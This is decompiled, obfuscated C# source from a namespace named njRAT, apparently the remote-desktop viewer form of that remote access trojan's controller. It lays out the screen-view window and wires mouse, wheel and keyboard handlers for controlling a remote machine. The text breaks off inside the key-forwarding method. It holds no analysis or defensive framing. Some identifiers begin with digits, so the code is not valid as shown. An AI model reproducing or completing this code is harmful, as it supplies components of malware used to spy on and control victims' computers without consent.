using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x02000048 RID: 72
	[DesignerGenerated]
	public partial class sc : Form
	{
		// Token: 0x060003BD RID: 957 RVA: 0x00028CF8 File Offset: 0x00026EF8
		public sc()
		{
			base.ResizeEnd += this.\u000E;
			base.FormClosing += this.\u0002;
			base.Load += this.\u0002;
			base.ResizeBegin += this.\u0006;
			this.QQ = string.Empty;
			this.Oimg = null;
			this.\u000F\u2000 = default(Point);
			this.\u0002\u2001 = default(Point);
			this.co = 0;
			this.Folder = string.Empty;
			this.\u0003\u2001 = new Point(30, 30);
			this.IsActive = false;
			this.fps = 0;
			this.\u0005\u2001 = 0;
			this.dbf = 0L;
			this.\u0002();
		}

		// Token: 0x060003BF RID: 959 RVA: 0x00028E10 File Offset: 0x00027010
		[DebuggerStepThrough]
		private void \u0002()
		{
			this.\u0002 = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(sc));
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(new Panel());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005(new CheckBox());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(new CheckBox());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003(new CheckBox());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(new ComboBox());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(new Label());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(new Button());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(new Timer(this.\u0002));
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003(new Timer(this.\u0002));
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(new PictureBox());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(new ProgressBar());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003(new Button());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().SuspendLayout();
			((ISupportInitialize)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()).BeginInit();
			this.SuspendLayout();
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002());
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Top;
			Control control = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			Point location = new Point(0, 0);
			control.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138482);
			Control control2 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			Size size = new Size(423, 27);
			control2.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().AutoSize = true;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().BackColor = Color.Black;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().FlatStyle = FlatStyle.Flat;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().ForeColor = Color.LightSteelBlue;
			Control control3 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005();
			location = new Point(329, 2);
			control3.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().Name = \u0006\u2001.\u0002(-1829138479);
			Control control4 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005();
			size = new Size(75, 18);
			control4.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().TabIndex = 7;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().Text = \u0006\u2001.\u0002(-1829138911);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().UseVisualStyleBackColor = false;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().AutoSize = true;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().FlatStyle = FlatStyle.Flat;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control5 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			location = new Point(255, 2);
			control5.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829118013);
			Control control6 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			size = new Size(75, 18);
			control6.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().TabIndex = 4;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829117997);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().UseVisualStyleBackColor = false;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().AutoSize = true;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().BackColor = Color.Black;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().FlatStyle = FlatStyle.Flat;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().ForeColor = Color.LightSteelBlue;
			Control control7 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003();
			location = new Point(197, 2);
			control7.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Name = \u0006\u2001.\u0002(-1829140166);
			Control control8 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003();
			size = new Size(61, 18);
			control8.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().TabIndex = 3;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Text = \u0006\u2001.\u0002(-1829118428);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().UseVisualStyleBackColor = false;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().DropDownStyle = ComboBoxStyle.DropDownList;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().FlatStyle = FlatStyle.Flat;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().FormattingEnabled = true;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Items.AddRange(new object[]
			{
				\u0006\u2001.\u0002(-1829138938),
				\u0006\u2001.\u0002(-1829118408),
				\u0006\u2001.\u0002(-1829138917),
				\u0006\u2001.\u0002(-1829118450),
				\u0006\u2001.\u0002(-1829138927),
				\u0006\u2001.\u0002(-1829118460),
				\u0006\u2001.\u0002(-1829138841),
				\u0006\u2001.\u0002(-1829118438),
				\u0006\u2001.\u0002(-1829138819),
				\u0006\u2001.\u0002(-1829118448),
				\u0006\u2001.\u0002(-1829138829)
			});
			Control control9 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			location = new Point(116, 2);
			control9.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138495);
			Control control10 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			size = new Size(78, 22);
			control10.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().TabIndex = 2;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().AutoSize = true;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control11 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			location = new Point(82, 5);
			control11.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139932);
			Control control12 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			size = new Size(30, 14);
			control12.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829139076);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().FlatStyle = FlatStyle.Flat;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control13 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			location = new Point(2, 1);
			control13.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139756);
			Control control14 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			size = new Size(75, 22);
			control14.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138894);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().UseVisualStyleBackColor = false;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Enabled = true;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Interval = 1000;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Enabled = true;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Interval = 10;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			Control control15 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 27);
			control15.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829129003);
			Control control16 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			size = new Size(423, 216);
			control16.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().SizeMode = PictureBoxSizeMode.StretchImage;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().TabStop = false;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Bottom;
			Control control17 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 243);
			control17.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138855);
			Control control18 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			size = new Size(423, 9);
			control18.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Step = 1;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Style = ProgressBarStyle.Continuous;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().TabIndex = 2;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().BackColor = Color.WhiteSmoke;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().BackgroundImage = global::\u0002\u2001.\u0002();
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().BackgroundImageLayout = ImageLayout.Zoom;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Cursor = Cursors.Hand;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().FlatStyle = FlatStyle.Flat;
			Control control19 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003();
			location = new Point(209, 27);
			control19.Location = location;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Name = \u0006\u2001.\u0002(-1829129765);
			Control control20 = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003();
			size = new Size(10, 12);
			control20.Size = size;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().TabIndex = 3;
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().UseVisualStyleBackColor = false;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(423, 252);
			this.ClientSize = size;
			this.Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003());
			this.Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002());
			this.ForeColor = Color.WhiteSmoke;
			this.Icon = (Icon)componentResourceManager.GetObject(\u0006\u2001.\u0002(-1829139480));
			this.Name = \u0006\u2001.\u0002(-1829128462);
			this.Text = \u0006\u2001.\u0002(-1829128462);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().ResumeLayout(false);
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().PerformLayout();
			((ISupportInitialize)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()).EndInit();
			this.ResumeLayout(false);
		}

		// Token: 0x060003C0 RID: 960 RVA: 0x000297B4 File Offset: 0x000279B4
		internal virtual Panel 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003;
		}

		// Token: 0x060003C1 RID: 961 RVA: 0x000297C8 File Offset: 0x000279C8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(Panel \u0002)
		{
			this.\u0003 = \u0002;
		}

		// Token: 0x060003C2 RID: 962 RVA: 0x000297D4 File Offset: 0x000279D4
		internal virtual ComboBox 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005;
		}

		// Token: 0x060003C3 RID: 963 RVA: 0x000297E8 File Offset: 0x000279E8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(ComboBox \u0002)
		{
			this.\u0005 = \u0002;
		}

		// Token: 0x060003C4 RID: 964 RVA: 0x000297F4 File Offset: 0x000279F4
		internal virtual Label 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008;
		}

		// Token: 0x060003C5 RID: 965 RVA: 0x00029808 File Offset: 0x00027A08
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(Label \u0002)
		{
			this.\u0008 = \u0002;
		}

		// Token: 0x060003C6 RID: 966 RVA: 0x00029814 File Offset: 0x00027A14
		internal virtual Button 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006;
		}

		// Token: 0x060003C7 RID: 967 RVA: 0x00029828 File Offset: 0x00027A28
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(Button \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005);
			if (this.\u0006 != null)
			{
				this.\u0006.Click -= value;
			}
			this.\u0006 = \u0002;
			if (this.\u0006 != null)
			{
				this.\u0006.Click += value;
			}
		}

		// Token: 0x060003C8 RID: 968 RVA: 0x00029878 File Offset: 0x00027A78
		internal virtual CheckBox 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000E;
		}

		// Token: 0x060003C9 RID: 969 RVA: 0x0002988C File Offset: 0x00027A8C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(CheckBox \u0002)
		{
			this.\u000E = \u0002;
		}

		// Token: 0x060003CA RID: 970 RVA: 0x00029898 File Offset: 0x00027A98
		internal virtual CheckBox 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000F;
		}

		// Token: 0x060003CB RID: 971 RVA: 0x000298AC File Offset: 0x00027AAC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003(CheckBox \u0002)
		{
			this.\u000F = \u0002;
		}

		// Token: 0x060003CC RID: 972 RVA: 0x000298B8 File Offset: 0x00027AB8
		internal virtual Timer 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0002\u2000;
		}

		// Token: 0x060003CD RID: 973 RVA: 0x000298CC File Offset: 0x00027ACC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008);
			if (this.\u0002\u2000 != null)
			{
				this.\u0002\u2000.Tick -= value;
			}
			this.\u0002\u2000 = \u0002;
			if (this.\u0002\u2000 != null)
			{
				this.\u0002\u2000.Tick += value;
			}
		}

		// Token: 0x060003CE RID: 974 RVA: 0x0002991C File Offset: 0x00027B1C
		internal virtual CheckBox 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u0003\u2000;
		}

		// Token: 0x060003CF RID: 975 RVA: 0x00029930 File Offset: 0x00027B30
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005(CheckBox \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F);
			if (this.\u0003\u2000 != null)
			{
				this.\u0003\u2000.CheckedChanged -= value;
			}
			this.\u0003\u2000 = \u0002;
			if (this.\u0003\u2000 != null)
			{
				this.\u0003\u2000.CheckedChanged += value;
			}
		}

		// Token: 0x060003D0 RID: 976 RVA: 0x00029980 File Offset: 0x00027B80
		internal virtual Timer 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0005\u2000;
		}

		// Token: 0x060003D1 RID: 977 RVA: 0x00029994 File Offset: 0x00027B94
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2000);
			if (this.\u0005\u2000 != null)
			{
				this.\u0005\u2000.Tick -= value;
			}
			this.\u0005\u2000 = \u0002;
			if (this.\u0005\u2000 != null)
			{
				this.\u0005\u2000.Tick += value;
			}
		}

		// Token: 0x060003D2 RID: 978 RVA: 0x000299E4 File Offset: 0x00027BE4
		internal virtual PictureBox 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008\u2000;
		}

		// Token: 0x060003D3 RID: 979 RVA: 0x000299F8 File Offset: 0x00027BF8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(PictureBox \u0002)
		{
			PaintEventHandler value = new PaintEventHandler(this.\u0002);
			MouseEventHandler value2 = new MouseEventHandler(this.\u0008);
			MouseEventHandler value3 = new MouseEventHandler(this.\u0005);
			MouseEventHandler value4 = new MouseEventHandler(this.\u0003);
			MouseEventHandler value5 = new MouseEventHandler(this.\u0002);
			EventHandler value6 = new EventHandler(this.\u0003);
			EventHandler value7 = new EventHandler(this.\u0005\u2000);
			EventHandler value8 = new EventHandler(this.\u0006\u2000);
			EventHandler value9 = new EventHandler(this.\u0003\u2000);
			if (this.\u0008\u2000 != null)
			{
				this.\u0008\u2000.Paint -= value;
				this.\u0008\u2000.MouseWheel -= value2;
				this.\u0008\u2000.MouseUp -= value3;
				this.\u0008\u2000.MouseDown -= value4;
				this.\u0008\u2000.MouseMove -= value5;
				this.\u0008\u2000.MouseEnter -= value6;
				this.\u0008\u2000.Click -= value7;
				this.\u0008\u2000.Resize -= value8;
				this.\u0008\u2000.MouseLeave -= value9;
			}
			this.\u0008\u2000 = \u0002;
			if (this.\u0008\u2000 != null)
			{
				this.\u0008\u2000.Paint += value;
				this.\u0008\u2000.MouseWheel += value2;
				this.\u0008\u2000.MouseUp += value3;
				this.\u0008\u2000.MouseDown += value4;
				this.\u0008\u2000.MouseMove += value5;
				this.\u0008\u2000.MouseEnter += value6;
				this.\u0008\u2000.Click += value7;
				this.\u0008\u2000.Resize += value8;
				this.\u0008\u2000.MouseLeave += value9;
			}
		}

		// Token: 0x060003D4 RID: 980 RVA: 0x00029B88 File Offset: 0x00027D88
		internal virtual ProgressBar 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006\u2000;
		}

		// Token: 0x060003D5 RID: 981 RVA: 0x00029B9C File Offset: 0x00027D9C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002(ProgressBar \u0002)
		{
			this.\u0006\u2000 = \u0002;
		}

		// Token: 0x060003D6 RID: 982 RVA: 0x00029BA8 File Offset: 0x00027DA8
		internal virtual Button 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000E\u2000;
		}

		// Token: 0x060003D7 RID: 983 RVA: 0x00029BBC File Offset: 0x00027DBC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void 2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003(Button \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008\u2000);
			if (this.\u000E\u2000 != null)
			{
				this.\u000E\u2000.Click -= value;
			}
			this.\u000E\u2000 = \u0002;
			if (this.\u000E\u2000 != null)
			{
				this.\u000E\u2000.Click += value;
			}
		}

		// Token: 0x060003D8 RID: 984 RVA: 0x00029C0C File Offset: 0x00027E0C
		public void KUP(object s, KeyEventArgs e)
		{
			if (Operators.CompareString(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) == 0)
			{
				return;
			}
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Focus();
			if (this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Checked)
			{
				Keys keyCode = e.KeyCode;
				if (keyCode == Keys.Shift || keyCode == Keys.ShiftKey || keyCode == Keys.LShiftKey || keyCode == Keys.RShiftKey)
				{
